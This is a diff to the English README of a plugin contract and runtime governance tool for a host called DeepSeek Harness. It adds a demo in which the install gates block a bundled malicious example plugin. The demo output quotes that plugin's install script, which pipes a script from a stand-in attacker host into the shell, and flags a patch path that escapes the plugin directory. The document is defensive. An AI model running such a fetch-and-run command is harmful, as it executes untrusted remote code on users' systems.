@@ -2,7 +2,7 @@
 
 **English** | [中文](README.zh-CN.md)
 
-![version](https://img.shields.io/badge/version-1.12.0-blue) ![node](https://img.shields.io/badge/node-%3E%3D%2020-green) ![license](https://img.shields.io/badge/license-MIT-lightgrey)
+![version](https://img.shields.io/badge/version-1.12.0-blue) ![node](https://img.shields.io/badge/node-%3E%3D%2020-green) ![license](https://img.shields.io/badge/license-MIT-lightgrey) ![status](https://img.shields.io/badge/status-WIP-orange)
 
 A plugin contract and runtime governance plugin for DeepSeek Harness. It turns "what a plugin is allowed to do" from a verbal agreement into a verifiable contract:
 manifest declarations, host grants, runtime interception, an audit ledger, installation gates, dual signing, capability portraits, offline autopsy, and compliance admission.
@@ -10,6 +10,30 @@ manifest declarations, host grants, runtime interception, an audit ledger, insta
 Zero third-party dependencies, Node.js >= 20 (CommonJS).
 
 > **TL;DR — four steps on the DSH desktop host**: add the dependency `"dsh-dashcam-host": "link:<workspace>/dsh-dashcam-host"` to the profile's `package.json`, append `dsh-dashcam-host` to `dsh.profile.bundles`, run one `pnpm install`, restart DeepSeek Harness — done. Details in [Fast install](#fast-install-dsh-desktop-host); `install-to-host.ps1` / `uninstall-from-host.ps1` at the workspace root automate all of it.
+
+## Demo: a malicious plugin gets blocked at install time
+
+Real output from the installation gates running on the bundled [negative example](examples/negative-plugin) — a manifest whose patch path escapes the plugin directory and whose install script pipes a remote script into `sh` (fields elided):
+
+```bash
+$ node bin/dsh-dashcam.js gates examples/negative-plugin --skip-signature
+{
+  "ok": false,
+  "blocked": true,
+  "plugin": "com.example.leaky",
+  "securityLabels": ["Untrusted"],
+  ...
+  "formatted": [
+    "[structure] manifest.json field=patches[0].path — patch 路径越出插件目录",
+    "[structure] manifest.json field=scripts.install — 安装脚本不在白名单：curl http://cdn.evil.example/install.sh | sh"
+  ],
+  "labelLines": [
+    "[Untrusted] — 调用方跳过验签，签名状态未知"
+  ]
+}
+```
+
+The pipeline fails fast: the `structure` gate blocks the install before signature/safety/contract stages ever run. Runtime messages are localized (Chinese); every failure points at an exact field and file.
 
 ## 1.11.0 Rename: dsh-covenant → dsh-dashcam
 
